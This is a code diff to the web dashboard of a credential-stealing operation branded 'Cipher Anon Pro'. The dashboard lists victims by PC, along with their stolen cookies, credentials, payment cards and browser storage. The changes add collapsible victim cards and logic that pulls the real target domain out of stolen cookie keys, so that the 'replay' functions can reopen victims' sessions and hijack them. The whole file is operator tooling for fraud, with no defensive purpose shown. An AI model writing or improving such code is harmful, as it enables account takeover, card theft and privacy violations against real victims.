@@ -476,21 +476,21 @@
         .btn-icon-sm.replay-storage:hover { background: rgba(139,92,246,0.08); }
         .btn-icon-sm.test-sm { border-color: #3b82f6; color: #3b82f6; }
         .btn-icon-sm.test-sm:hover { background: rgba(59,130,246,0.08); }
+        .btn-icon-sm.expand-sm { border-color: #475569; color: #94a3b8; }
+        .btn-icon-sm.expand-sm:hover { border-color: #64748b; color: #e2e8f0; background: #1a2538; }
 
-        /* PC CARD — MAIN */
+        /* PC CARD — ACCORDION STYLE */
         .pc-grid {
             display: grid;
             grid-template-columns: 1fr;
-            gap: 16px;
+            gap: 12px;
         }
         .pc-card {
             background: #0f1626;
             border: 1px solid #1a2538;
             border-radius: 12px;
-            padding: 16px 18px;
-            transition: all 0.3s ease;
-            position: relative;
             overflow: hidden;
+            transition: all 0.3s ease;
         }
         .pc-card:hover { border-color: #2a3a5a; box-shadow: 0 8px 40px rgba(0,0,0,0.4); }
 
@@ -498,19 +498,29 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
-            flex-wrap: wrap;
+            padding: 14px 18px;
+            cursor: pointer;
+            transition: background 0.2s ease;
             gap: 8px;
-            margin-bottom: 6px;
+            flex-wrap: wrap;
         }
+        .pc-card .pc-header:hover { background: #1a2538; }
         .pc-card .pc-header .pc-name {
-            font-size: 16px;
+            font-size: 15px;
             font-weight: 700;
             color: #f1f5f9;
             display: flex;
             align-items: center;
             gap: 8px;
         }
-        .pc-card .pc-header .pc-name .icon { font-size: 20px; }
+        .pc-card .pc-header .pc-name .icon { font-size: 18px; }
+        .pc-card .pc-header .pc-name .expand-icon {
+            font-size: 12px;
+            color: #64748b;
+            transition: transform 0.3s ease;
+            display: inline-block;
+        }
+        .pc-card .pc-header .pc-name .expand-icon.open { transform: rotate(180deg); }
         .pc-card .pc-header .pc-stats {
             font-size: 11px;
             color: #64748b;
@@ -531,13 +541,22 @@
             display: flex;
             gap: 12px;
             flex-wrap: wrap;
-            margin-bottom: 10px;
-            padding-bottom: 8px;
-            border-bottom: 1px solid #1a2538;
+            padding: 0 18px 8px 18px;
         }
         .pc-card .pc-meta .flag { font-size: 14px; }
         .pc-card .pc-meta .ip { color: #94a3b8; font-family: monospace; }
         .pc-card .pc-meta .country { color: #94a3b8; }
+
+        .pc-card .pc-body {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.4s ease, padding 0.3s ease;
+            padding: 0 18px;
+        }
+        .pc-card .pc-body.open {
+            max-height: 2000px;
+            padding: 0 18px 16px 18px;
+        }
 
         .pc-card .domain-list {
             display: grid;
@@ -612,15 +631,15 @@
             transform: none;
         }
 
-        .pc-card .pc-actions {
-            margin-top: 10px;
-            padding-top: 10px;
+        .pc-card .pc-footer-actions {
+            padding: 10px 18px 14px 18px;
             border-top: 1px solid #1a2538;
             display: flex;
             gap: 6px;
             flex-wrap: wrap;
+            margin-top: 4px;
         }
-        .pc-card .pc-actions .btn-sm {
+        .pc-card .pc-footer-actions .btn-sm {
             padding: 2px 10px;
             font-size: 9px;
             border-radius: 4px;
@@ -631,13 +650,13 @@
             transition: all 0.2s ease;
             font-weight: 500;
         }
-        .pc-card .pc-actions .btn-sm:hover { border-color: #2a3a5a; color: #e2e8f0; transform: translateY(-1px); }
-        .pc-card .pc-actions .btn-sm.danger { border-color: #ff4444; color: #ff4444; }
-        .pc-card .pc-actions .btn-sm.danger:hover { background: rgba(255,68,68,0.15); }
-        .pc-card .pc-actions .btn-sm.primary { border-color: #00ff88; color: #00ff88; }
-        .pc-card .pc-actions .btn-sm.primary:hover { background: rgba(0,255,136,0.08); }
-        .pc-card .pc-actions .btn-sm.violet { border-color: #8b5cf6; color: #8b5cf6; }
-        .pc-card .pc-actions .btn-sm.violet:hover { background: rgba(139,92,246,0.08); }
+        .pc-card .pc-footer-actions .btn-sm:hover { border-color: #2a3a5a; color: #e2e8f0; transform: translateY(-1px); }
+        .pc-card .pc-footer-actions .btn-sm.danger { border-color: #ff4444; color: #ff4444; }
+        .pc-card .pc-footer-actions .btn-sm.danger:hover { background: rgba(255,68,68,0.15); }
+        .pc-card .pc-footer-actions .btn-sm.primary { border-color: #00ff88; color: #00ff88; }
+        .pc-card .pc-footer-actions .btn-sm.primary:hover { background: rgba(0,255,136,0.08); }
+        .pc-card .pc-footer-actions .btn-sm.violet { border-color: #8b5cf6; color: #8b5cf6; }
+        .pc-card .pc-footer-actions .btn-sm.violet:hover { background: rgba(139,92,246,0.08); }
 
         .view-content { display: none; }
         .view-content.active { display: block; }
@@ -691,17 +710,120 @@
         .storage-row .storage-browser { color: #64748b; font-size: 8px; background: #1a2538; padding: 1px 6px; border-radius: 4px; }
         .storage-row .pc-label { color: #f472b6; font-weight: 500; font-size: 10px; }
 
+        .victims-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 12px;
+            margin-top: 12px;
+        }
+        .victims-grid .section-header {
+            font-size: 13px;
+            font-weight: 600;
+            color: #f1f5f9;
+            padding: 8px 4px;
+            border-bottom: 1px solid #1a2538;
+            margin-bottom: 4px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .victims-grid .section-header .count { color: #64748b; font-weight: 400; font-size: 12px; }
+
+        .victim-card {
+            background: #0f1626;
+            border: 1px solid #1a2538;
+            border-radius: 10px;
+            padding: 12px 16px;
+            transition: 0.2s;
+            cursor: pointer;
+            position: relative;
+        }
+        .victim-card:hover { border-color: #2a3a5a; transform: translateY(-2px); box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
+        .victim-card .v-header { display: flex; align-items: center; gap: 8px; margin-bottom: 4px; flex-wrap: wrap; }
+        .victim-card .v-header .flag { font-size: 18px; }
+        .victim-card .v-header .ip { font-family: monospace; font-size: 12px; color: #e2e8f0; font-weight: 600; }
+        .victim-card .v-header .pc-name { color: #f472b6; font-weight: 600; font-size: 13px; }
+        .victim-card .v-details { font-size: 10px; color: #64748b; display: flex; flex-wrap: wrap; gap: 8px; }
+        .victim-card .v-details .country { color: #94a3b8; }
+        .victim-card .v-details .domain { color: #00ff88; }
+        .victim-card .v-details .time { color: #475569; }
+        .victim-card .v-stats {
+            font-size: 9px;
+            color: #64748b;
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin: 4px 0;
+        }
+        .victim-card .v-stats .cookies { color: #00ff88; }
+        .victim-card .v-stats .creds { color: #ec4899; }
+        .victim-card .v-stats .cards { color: #06b6d4; }
+        .victim-card .v-stats .storage { color: #8b5cf6; }
+        .victim-card .v-delete {
+            position: absolute;
+            top: 8px;
+            right: 8px;
+            background: transparent;
+            border: none;
+            color: #475569;
+            font-size: 12px;
+            cursor: pointer;
+            transition: 0.2s;
+            padding: 2px 4px;
+            border-radius: 4px;
+        }
+        .victim-card .v-delete:hover { color: #ff4444; background: rgba(255,68,68,0.1); }
+        .victim-card .v-actions {
+            display: flex;
+            gap: 4px;
+            margin-top: 6px;
+            padding-top: 6px;
+            border-top: 1px solid #1a2538;
+            flex-wrap: wrap;
+        }
+        .victim-card .v-actions .btn-sm {
+            padding: 2px 8px;
+            font-size: 8px;
+            border-radius: 4px;
+            border: 1px solid #1a2538;
+            background: transparent;
+            color: #64748b;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            font-weight: 500;
+        }
+        .victim-card .v-actions .btn-sm:hover { border-color: #2a3a5a; color: #e2e8f0; transform: translateY(-1px); }
+        .victim-card .v-actions .btn-sm.replay-cookies { border-color: #00ff88; color: #00ff88; }
+        .victim-card .v-actions .btn-sm.replay-cookies:hover { background: rgba(0,255,136,0.08); }
+        .victim-card .v-actions .btn-sm.replay-storage { border-color: #8b5cf6; color: #8b5cf6; }
+        .victim-card .v-actions .btn-sm.replay-storage:hover { background: rgba(139,92,246,0.08); }
+        .victim-card .v-actions .btn-sm.test-sm { border-color: #3b82f6; color: #3b82f6; }
+        .victim-card .v-actions .btn-sm.test-sm:hover { background: rgba(59,130,246,0.08); }
+        .victim-card .v-actions .btn-sm.download { border-color: #f59e0b; color: #f59e0b; }
+        .victim-card .v-actions .btn-sm.download:hover { background: rgba(245,158,11,0.08); }
+        .victim-card .v-actions .btn-sm.view { border-color: #3b82f6; color: #3b82f6; }
+        .victim-card .v-actions .btn-sm.view:hover { background: rgba(59,130,246,0.08); }
+        .victim-card .v-actions .btn-sm.disabled {
+            opacity: 0.3;
+            cursor: default;
+            border-color: #334155;
+        }
+        .victim-card .v-actions .btn-sm.disabled:hover {
+            background: transparent;
+            transform: none;
+        }
+
         /* REPLAY GRID */
         .replay-grid {
             display: grid;
             grid-template-columns: 1fr;
-            gap: 16px;
+            gap: 12px;
         }
         .replay-card {
             background: #0f1626;
             border: 1px solid #1a2538;
-            border-radius: 12px;
-            padding: 16px 18px;
+            border-radius: 10px;
+            padding: 14px 16px;
             transition: all 0.3s ease;
         }
         .replay-card:hover { border-color: #2a3a5a; transform: translateY(-2px); box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
@@ -715,6 +837,18 @@
         .replay-card .r-header .flag { font-size: 18px; }
         .replay-card .r-header .ip { font-family: monospace; font-size: 12px; color: #e2e8f0; font-weight: 600; }
         .replay-card .r-header .pc-name { color: #f472b6; font-weight: 600; font-size: 13px; }
+        .replay-card .r-stats {
+            font-size: 10px;
+            color: #64748b;
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+            margin: 4px 0;
+        }
+        .replay-card .r-stats .cookies { color: #00ff88; }
+        .replay-card .r-stats .storage { color: #8b5cf6; }
+        .replay-card .r-stats .creds { color: #ec4899; }
+        .replay-card .r-stats .cards { color: #06b6d4; }
         .replay-card .r-domain-list {
             display: flex;
             flex-wrap: wrap;
@@ -765,107 +899,6 @@
             border-color: #334155;
         }
         .replay-card .r-actions .btn-sm.disabled:hover {
-            background: transparent;
-            transform: none;
-        }
-        .replay-card .r-stats {
-            font-size: 10px;
-            color: #64748b;
-            display: flex;
-            gap: 12px;
-            flex-wrap: wrap;
-            margin: 4px 0;
-        }
-        .replay-card .r-stats .cookies { color: #00ff88; }
-        .replay-card .r-stats .storage { color: #8b5cf6; }
-        .replay-card .r-stats .creds { color: #ec4899; }
-        .replay-card .r-stats .cards { color: #06b6d4; }
-
-        .victims-grid {
-            display: grid;
-            grid-template-columns: 1fr;
-            gap: 16px;
-        }
-        .victim-card {
-            background: #0f1626;
-            border: 1px solid #1a2538;
-            border-radius: 12px;
-            padding: 14px 16px;
-            transition: 0.2s;
-            cursor: pointer;
-            position: relative;
-        }
-        .victim-card:hover { border-color: #2a3a5a; transform: translateY(-2px); box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
-        .victim-card .v-header { display: flex; align-items: center; gap: 8px; margin-bottom: 4px; flex-wrap: wrap; }
-        .victim-card .v-header .flag { font-size: 18px; }
-        .victim-card .v-header .ip { font-family: monospace; font-size: 12px; color: #e2e8f0; font-weight: 600; }
-        .victim-card .v-header .pc-name { color: #f472b6; font-weight: 600; font-size: 13px; }
-        .victim-card .v-details { font-size: 10px; color: #64748b; display: flex; flex-wrap: wrap; gap: 8px; }
-        .victim-card .v-details .country { color: #94a3b8; }
-        .victim-card .v-details .time { color: #475569; }
-        .victim-card .v-domain-list {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 4px;
-            margin: 4px 0;
-        }
-        .victim-card .v-domain-list .domain-tag {
-            background: #1a2538;
-            padding: 1px 8px;
-            border-radius: 10px;
-            font-size: 8px;
-            color: #94a3b8;
-            border: 1px solid #1e293b;
-        }
-        .victim-card .v-domain-list .domain-tag .count { color: #00ff88; }
-        .victim-card .v-delete {
-            position: absolute;
-            top: 8px;
-            right: 8px;
-            background: transparent;
-            border: none;
-            color: #475569;
-            font-size: 12px;
-            cursor: pointer;
-            transition: 0.2s;
-            padding: 2px 4px;
-            border-radius: 4px;
-        }
-        .victim-card .v-delete:hover { color: #ff4444; background: rgba(255,68,68,0.1); }
-        .victim-card .v-actions {
-            display: flex;
-            gap: 4px;
-            margin-top: 8px;
-            padding-top: 8px;
-            border-top: 1px solid #1a2538;
-            flex-wrap: wrap;
-        }
-        .victim-card .v-actions .btn-sm {
-            padding: 2px 8px;
-            font-size: 8px;
-            border-radius: 4px;
-            border: 1px solid #1a2538;
-            background: transparent;
-            color: #64748b;
-            cursor: pointer;
-            transition: all 0.2s ease;
-            font-weight: 500;
-        }
-        .victim-card .v-actions .btn-sm:hover { border-color: #2a3a5a; color: #e2e8f0; transform: translateY(-1px); }
-        .victim-card .v-actions .btn-sm.replay-cookies { border-color: #00ff88; color: #00ff88; }
-        .victim-card .v-actions .btn-sm.replay-cookies:hover { background: rgba(0,255,136,0.08); }
-        .victim-card .v-actions .btn-sm.replay-storage { border-color: #8b5cf6; color: #8b5cf6; }
-        .victim-card .v-actions .btn-sm.replay-storage:hover { background: rgba(139,92,246,0.08); }
-        .victim-card .v-actions .btn-sm.test-sm { border-color: #3b82f6; color: #3b82f6; }
-        .victim-card .v-actions .btn-sm.test-sm:hover { background: rgba(59,130,246,0.08); }
-        .victim-card .v-actions .btn-sm.download { border-color: #f59e0b; color: #f59e0b; }
-        .victim-card .v-actions .btn-sm.download:hover { background: rgba(245,158,11,0.08); }
-        .victim-card .v-actions .btn-sm.disabled {
-            opacity: 0.3;
-            cursor: default;
-            border-color: #334155;
-        }
-        .victim-card .v-actions .btn-sm.disabled:hover {
             background: transparent;
             transform: none;
         }
@@ -1195,6 +1228,7 @@
             .pc-card .domain-item { flex-direction: column; align-items: flex-start; }
             .pc-card .domain-item .domain-actions { margin-top: 4px; width: 100%; justify-content: flex-start; }
             .pc-card .pc-header .pc-stats { font-size: 10px; gap: 8px; }
+            .pc-card .pc-header { padding: 12px 14px; }
             .victim-card .v-header .pc-name { font-size: 12px; }
             .replay-card .r-header .pc-name { font-size: 12px; }
         }
@@ -1207,13 +1241,13 @@
             .topbar .right .logout-btn { font-size: 11px; padding: 3px 8px; }
             .topbar .right .user { font-size: 11px; padding: 3px 8px; }
             .topbar .right .live-badge { font-size: 11px; padding: 3px 8px; }
-            .pc-card { padding: 12px 14px; }
-            .pc-card .pc-header .pc-name { font-size: 14px; }
+            .pc-card { border-radius: 10px; }
+            .pc-card .pc-header .pc-name { font-size: 13px; }
             .pc-card .domain-item { padding: 4px 8px; }
             .pc-card .domain-item .domain-name { font-size: 11px; }
             .pc-card .domain-item .domain-stats { font-size: 8px; gap: 4px; }
             .pc-card .domain-item .domain-actions .btn-sm { font-size: 7px; padding: 1px 4px; }
-            .pc-card .pc-actions .btn-sm { font-size: 8px; padding: 1px 6px; }
+            .pc-card .pc-footer-actions .btn-sm { font-size: 8px; padding: 1px 6px; }
             .modal .victim-entry .victim-header .ip { font-size: 11px; }
             .modal .victim-entry .victim-header .flag { font-size: 16px; }
             .modal .victim-entry .data-section .data-item { font-size: 9px; }
@@ -1232,17 +1266,15 @@
             .replay-card .r-actions .btn-sm { font-size: 7px; padding: 1px 5px; }
             .victim-card .v-header .pc-name { font-size: 11px; }
             .replay-card .r-header .pc-name { font-size: 11px; }
-            .victim-card .v-domain-list .domain-tag { font-size: 7px; padding: 1px 5px; }
-            .replay-card .r-domain-list .domain-tag { font-size: 7px; padding: 1px 5px; }
         }
         @media (max-width: 360px) {
             .main { padding: 10px; padding-top: 48px; }
-            .pc-card { padding: 10px 10px; }
+            .pc-card { padding: 0; }
             .pc-card .pc-header .pc-name { font-size: 12px; }
             .pc-card .pc-header .pc-stats { font-size: 9px; gap: 4px; }
             .pc-card .domain-item .domain-name { font-size: 10px; }
             .pc-card .domain-item .domain-actions .btn-sm { font-size: 6px; padding: 1px 3px; }
-            .pc-card .pc-actions .btn-sm { font-size: 7px; padding: 1px 4px; }
+            .pc-card .pc-footer-actions .btn-sm { font-size: 7px; padding: 1px 4px; }
             .modal .victim-entry .data-section .data-item .value { min-width: 40px; font-size: 8px; }
             .modal .victim-entry .data-section .data-item .label { font-size: 8px; min-width: 30px; }
             .modal .victim-entry .modal-actions { max-width: 60px; }
@@ -1328,7 +1360,7 @@
         <div class="topbar" id="topbar">
             <div class="page-title">
                 <h2 id="pageTitle">Dashboard</h2>
-                <p id="pageSub">Monitor stolen cookies &amp; sessions · <span class="accent">Cipher Anon</span> Pro</p>
+                <p id="pageSub">Monitor stolen data · <span class="accent">Cipher Anon</span> Pro</p>
             </div>
             <div class="right">
                 <a href="https://t.me/nullrouterot13" target="_blank" class="contact-btn" title="Contact Support on Telegram">
@@ -1347,7 +1379,7 @@
             </div>
         </div>
 
-        <!-- VIEW: MAIN DASHBOARD — PC GROUPED -->
+        <!-- VIEW: MAIN DASHBOARD -->
         <div class="view-content active" id="viewMain">
             <div class="stats-row" id="statsRow">
                 <div class="stat-card">
@@ -1403,7 +1435,7 @@
             </div>
         </div>
 
-        <!-- VIEW: COOKIES — PC GROUPED -->
+        <!-- VIEW: COOKIES -->
         <div class="view-content" id="viewCookies">
             <div class="toolbar" style="margin-bottom:12px;">
                 <div class="left"><span style="color:#64748b;font-size:12px;">All stolen cookies — grouped by PC</span></div>
@@ -1414,7 +1446,7 @@
             </div>
         </div>
 
-        <!-- VIEW: VICTIMS — PC GROUPED -->
+        <!-- VIEW: VICTIMS -->
         <div class="view-content" id="viewVictims">
             <div class="toolbar" style="margin-bottom:12px;">
                 <div class="left"><span style="color:#64748b;font-size:12px;">All victims — grouped by PC</span></div>
@@ -1425,7 +1457,7 @@
             </div>
         </div>
 
-        <!-- VIEW: CREDENTIALS — PC GROUPED -->
+        <!-- VIEW: CREDENTIALS -->
         <div class="view-content" id="viewCreds">
             <div class="toolbar" style="margin-bottom:12px;">
                 <div class="left"><span style="color:#ec4899;font-size:12px;">🔐 Stolen Credentials — grouped by PC</span></div>
@@ -1436,7 +1468,7 @@
             </div>
         </div>
 
-        <!-- VIEW: CARDS — PC GROUPED -->
+        <!-- VIEW: CARDS -->
         <div class="view-content" id="viewCards">
             <div class="toolbar" style="margin-bottom:12px;">
                 <div class="left"><span style="color:#06b6d4;font-size:12px;">💳 Stolen Cards — grouped by PC</span></div>
@@ -1447,7 +1479,7 @@
             </div>
         </div>
 
-        <!-- VIEW: LOCALSTORAGE — PC GROUPED -->
+        <!-- VIEW: LOCALSTORAGE -->
         <div class="view-content" id="viewStorage">
             <div class="toolbar" style="margin-bottom:12px;">
                 <div class="left"><span style="color:#8b5cf6;font-size:12px;">💾 Stolen LocalStorage — grouped by PC</span></div>
@@ -1486,7 +1518,7 @@
             </div>
         </div>
 
-        <!-- VIEW: REPLAY — PC GROUPED -->
+        <!-- VIEW: REPLAY -->
         <div class="view-content" id="viewReplay">
             <div class="toolbar" style="margin-bottom:12px;">
                 <div class="left"><span style="color:#f472b6;font-size:12px;">▶️ Replay — grouped by PC</span></div>
@@ -1513,7 +1545,7 @@
             </div>
         </div>
 
-        <!-- VIEW: EXPORT DATA -->
+        <!-- VIEW: EXPORT -->
         <div class="view-content" id="viewExport">
             <div class="toolbar" style="margin-bottom:12px;">
                 <div class="left"><span style="color:#64748b;font-size:12px;">Export formats</span></div>
@@ -1645,7 +1677,7 @@
     <div class="toast" id="toast"></div>
 
     <!-- ============================================================
-    DASHBOARD LOGIC — PC GROUPING
+    DASHBOARD LOGIC — PC GROUPING + ACCORDION + FIXED DOMAINS
     ============================================================ -->
     <script>
         // ============================================================
@@ -1921,7 +1953,31 @@
                         domains: {}
                     };
                 }
-                const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
+                // Get the REAL domain from the entry
+                let domain = entry.fingerprint?.hostname || entry.domain || '';
+                // If domain is empty or PC name, try to extract from cookies
+                if (!domain || domain === pc || domain === 'unknown') {
+                    // Try to get domain from cookies keys
+                    const cookieKeys = Object.keys(entry.cookies || {});
+                    if (cookieKeys.length > 0) {
+                        // Try to extract domain from first cookie key or use the first domain we find
+                        const cookieDomains = cookieKeys.map(k => {
+                            const parts = k.split('|');
+                            return parts.length > 1 ? parts[0] : null;
+                        }).filter(d => d && d !== 'unknown' && !d.includes('railway.app'));
+                        if (cookieDomains.length > 0) {
+                            domain = cookieDomains[0];
+                        } else {
+                            // Fallback: use the first cookie's name or just 'unknown'
+                            domain = 'unknown';
+                        }
+                    } else {
+                        domain = 'unknown';
+                    }
+                }
+                // Clean up domain
+                domain = domain.replace(/^\./, '');
+                
                 if (!grouped[pc].domains[domain]) {
                     grouped[pc].domains[domain] = {
                         domain: domain,
@@ -1959,7 +2015,7 @@
         }
 
         // ============================================================
-        // RENDER DASHBOARD — PC GROUPED
+        // RENDER DASHBOARD — ACCORDION PC CARDS
         // ============================================================
 
         function render(data) {
@@ -1974,10 +2030,11 @@
                 return;
             }
 
-            pcNames.forEach(pcName => {
+            pcNames.forEach((pcName, index) => {
                 const pc = grouped[pcName];
                 const flag = getFlagEmoji(pc.countryCode);
                 const domainNames = Object.keys(pc.domains);
+                const isOpen = index === 0;
 
                 let domainsHtml = '';
                 domainNames.forEach(domain => {
@@ -1985,8 +2042,12 @@
                     const hasCookies = d.cookies > 0;
                     const hasStorage = d.storage > 0;
 
+                    // Get first entry for this domain to use for replay
+                    const firstEntry = d.entries[0] || null;
+                    const entryId = firstEntry ? firstEntry._uniqueId : '';
+
                     domainsHtml += `
-                        <div class="domain-item">
+                        <div class="domain-item" onclick="event.stopPropagation(); openModalForEntry('${entryId}')" style="cursor:pointer;">
                             <span class="domain-name">🌐 ${domain}</span>
                             <div class="domain-stats">
                                 <span class="cookies">🍪 ${d.cookies}</span>
@@ -2008,11 +2069,12 @@
                 const card = document.createElement('div');
                 card.className = 'pc-card';
                 card.innerHTML = `
-                    <div class="pc-header">
+                    <div class="pc-header" onclick="togglePC('${pcName.replace(/'/g, "\\'")}')">
                         <div class="pc-name">
                             <span class="icon">🖥️</span>
                             ${pcName}
                             <span style="font-size:11px;color:#64748b;font-weight:400;">(${pc.totalVictims} victims)</span>
+                            <span class="expand-icon ${isOpen ? 'open' : ''}" id="expand-${pcName.replace(/[^a-zA-Z0-9]/g, '_')}">▼</span>
                         </div>
                         <div class="pc-stats">
                             <span class="cookies">🍪 ${pc.totalCookies}</span>
@@ -2027,10 +2089,12 @@
                         <span class="country">${pc.country}</span>
                         <span style="color:#475569;">🕐 ${timeAgo(pc.latestTime)}</span>
                     </div>
-                    <div class="domain-list">
-                        ${domainsHtml}
+                    <div class="pc-body ${isOpen ? 'open' : ''}" id="body-${pcName.replace(/[^a-zA-Z0-9]/g, '_')}">
+                        <div class="domain-list">
+                            ${domainsHtml}
+                        </div>
                     </div>
-                    <div class="pc-actions">
+                    <div class="pc-footer-actions">
                         <button class="btn-sm danger" onclick="showDeletePCConfirm('${pcName}')">🗑️ Delete PC</button>
                         <button class="btn-sm primary" onclick="downloadPCTxt('${pcName}')">📝 TXT</button>
                         <button class="btn-sm violet" onclick="downloadPCJson('${pcName}')">📄 JSON</button>
@@ -2056,13 +2120,11 @@
                 const pc = grouped[pcName];
                 const flag = getFlagEmoji(pc.countryCode);
 
-                const card = document.createElement('div');
-                card.className = 'pc-card';
                 let domainsHtml = '';
                 Object.keys(pc.domains).forEach(domain => {
                     const d = pc.domains[domain];
                     domainsHtml += `
-                        <div class="domain-item">
+                        <div class="domain-item" style="cursor:default;">
                             <span class="domain-name">🌐 ${domain}</span>
                             <div class="domain-stats">
                                 <span class="cookies">🍪 ${d.cookies}</span>
@@ -2073,8 +2135,11 @@
                         </div>
                     `;
                 });
+
+                const card = document.createElement('div');
+                card.className = 'pc-card';
                 card.innerHTML = `
-                    <div class="pc-header">
+                    <div class="pc-header" style="cursor:default;">
                         <div class="pc-name">
                             <span class="icon">🗑️</span>
                             ${pcName}
@@ -2093,8 +2158,10 @@
                         <span class="country">${pc.country}</span>
                         <span style="color:#f59e0b;">🗑️ Deleted</span>
                     </div>
-                    <div class="domain-list">${domainsHtml}</div>
-                    <div class="pc-actions">
+                    <div class="pc-body open">
+                        <div class="domain-list">${domainsHtml}</div>
+                    </div>
+                    <div class="pc-footer-actions">
                         <button class="btn-sm primary" onclick="showRestorePCConfirm('${pcName}')">↩️ Restore PC</button>
                         <button class="btn-sm danger" onclick="showPermanentDeletePCConfirm('${pcName}')">🗑️ Permanently Delete</button>
                     </div>
@@ -2104,13 +2171,46 @@
         }
 
         // ============================================================
+        // ACCORDION TOGGLE
+        // ============================================================
+
+        function togglePC(pcName) {
+            const safeName = pcName.replace(/[^a-zA-Z0-9]/g, '_');
+            const body = document.getElementById('body-' + safeName);
+            const icon = document.getElementById('expand-' + safeName);
+            if (body) {
+                body.classList.toggle('open');
+                if (icon) {
+                    icon.classList.toggle('open');
+                }
+            }
+        }
+
+        // ============================================================
         // REPLAY FUNCTIONS FOR PC + DOMAIN
         // ============================================================
 
         function getEntryForPCDomain(pcName, domain) {
             for (const entry of allData) {
                 const entryPc = entry.pcName || entry.fingerprint?.hostname || entry.ip || 'Unknown PC';
-                const entryDomain = entry.fingerprint?.hostname || entry.domain || 'unknown';
+                // Get the real domain from entry
+                let entryDomain = entry.fingerprint?.hostname || entry.domain || '';
+                if (!entryDomain || entryDomain === entryPc || entryDomain === 'unknown') {
+                    const cookieKeys = Object.keys(entry.cookies || {});
+                    if (cookieKeys.length > 0) {
+                        const cookieDomains = cookieKeys.map(k => {
+                            const parts = k.split('|');
+                            return parts.length > 1 ? parts[0] : null;
+                        }).filter(d => d && d !== 'unknown' && !d.includes('railway.app'));
+                        if (cookieDomains.length > 0) {
+                            entryDomain = cookieDomains[0];
+                        } else {
+                            entryDomain = 'unknown';
+                        }
+                    } else {
+                        entryDomain = 'unknown';
+                    }
+                }
                 if (entryPc === pcName && entryDomain === domain) {
                     return entry;
                 }
@@ -2131,8 +2231,19 @@
             }
             let actualDomain = domain;
             if (actualDomain.includes('railway.app') || actualDomain.includes('up.railway') || actualDomain === 'unknown') {
-                showToast('⚠️ Invalid domain for replay', 'error');
-                return;
+                // Try to find a better domain from cookies
+                const cookieKeys = Object.keys(cookies);
+                for (const key of cookieKeys) {
+                    const parts = key.split('|');
+                    if (parts.length > 1 && parts[0] && !parts[0].includes('railway.app') && parts[0] !== 'unknown') {
+                        actualDomain = parts[0];
+                        break;
+                    }
+                }
+                if (actualDomain.includes('railway.app') || actualDomain.includes('up.railway') || actualDomain === 'unknown') {
+                    showToast('⚠️ Invalid domain for replay', 'error');
+                    return;
+                }
             }
             const win = window.open('', '_blank');
             if (!win) {
@@ -2173,8 +2284,19 @@
             }
             let actualDomain = domain;
             if (actualDomain.includes('railway.app') || actualDomain.includes('up.railway') || actualDomain === 'unknown') {
-                showToast('⚠️ Invalid domain for replay', 'error');
-                return;
+                // Try to find a better domain from storage keys
+                const storageKeys = Object.keys(storage);
+                for (const key of storageKeys) {
+                    const parts = key.split(':');
+                    if (parts.length > 1 && parts[0] && !parts[0].includes('railway.app') && parts[0] !== 'unknown') {
+                        actualDomain = parts[0];
+                        break;
+                    }
+                }
+                if (actualDomain.includes('railway.app') || actualDomain.includes('up.railway') || actualDomain === 'unknown') {
+                    showToast('⚠️ Invalid domain for replay', 'error');
+                    return;
+                }
             }
             const win = window.open('', '_blank');
             if (!win) {
@@ -2215,8 +2337,19 @@
             }
             let actualDomain = domain;
             if (actualDomain.includes('railway.app') || actualDomain.includes('up.railway') || actualDomain === 'unknown') {
-                showToast('⚠️ Invalid domain for test', 'error');
-                return;
+                // Try to find a better domain from cookies
+                const cookieKeys = Object.keys(cookies);
+                for (const key of cookieKeys) {
+                    const parts = key.split('|');
+                    if (parts.length > 1 && parts[0] && !parts[0].includes('railway.app') && parts[0] !== 'unknown') {
+                        actualDomain = parts[0];
+                        break;
+                    }
+                }
+                if (actualDomain.includes('railway.app') || actualDomain.includes('up.railway') || actualDomain === 'unknown') {
+                    showToast('⚠️ Invalid domain for test', 'error');
+                    return;
+                }
             }
             const cleanDomain = actualDomain.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
             window.open('https://' + cleanDomain, '_blank');
@@ -2261,9 +2394,11 @@
         // ============================================================
 
         function showDeletePCConfirm(pcName) {
+            const grouped = groupByPC(allData);
+            const count = grouped[pcName]?.totalVictims || 0;
             showCustomConfirm(
                 'Delete PC',
-                `Delete ALL ${groupByPC(allData)[pcName]?.totalVictims || 0} victims from ${pcName}?`,
+                `Delete ALL ${count} victims from ${pcName}?`,
                 '🗑️',
                 () => { deletePC(pcName); },
                 true
@@ -2386,7 +2521,7 @@
         }
 
         // ============================================================
-        // COOKIES VIEW — PC GROUPED
+        // COOKIES VIEW
         // ============================================================
 
         function renderCookiesView() {
@@ -2461,7 +2596,7 @@
         }
 
         // ============================================================
-        // CREDENTIALS VIEW — PC GROUPED
+        // CREDENTIALS VIEW
         // ============================================================
 
         function renderCredsView() {
@@ -2470,7 +2605,23 @@
 
             allData.forEach(entry => {
                 const pc = entry.pcName || entry.fingerprint?.hostname || entry.ip || 'Unknown PC';
-                const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
+                let domain = entry.fingerprint?.hostname || entry.domain || '';
+                if (!domain || domain === pc || domain === 'unknown') {
+                    const cookieKeys = Object.keys(entry.cookies || {});
+                    if (cookieKeys.length > 0) {
+                        const cookieDomains = cookieKeys.map(k => {
+                            const parts = k.split('|');
+                            return parts.length > 1 ? parts[0] : null;
+                        }).filter(d => d && d !== 'unknown' && !d.includes('railway.app'));
+                        if (cookieDomains.length > 0) {
+                            domain = cookieDomains[0];
+                        } else {
+                            domain = 'unknown';
+                        }
+                    } else {
+                        domain = 'unknown';
+                    }
+                }
                 const creds = entry.credentials || [];
                 creds.forEach(c => {
                     const name = c.name || c.username || c.field || 'unknown';
@@ -2545,7 +2696,7 @@
         }
 
         // ============================================================
-        // CARDS VIEW — PC GROUPED
+        // CARDS VIEW
         // ============================================================
 
         function renderCardsView() {
@@ -2554,7 +2705,23 @@
 
             allData.forEach(entry => {
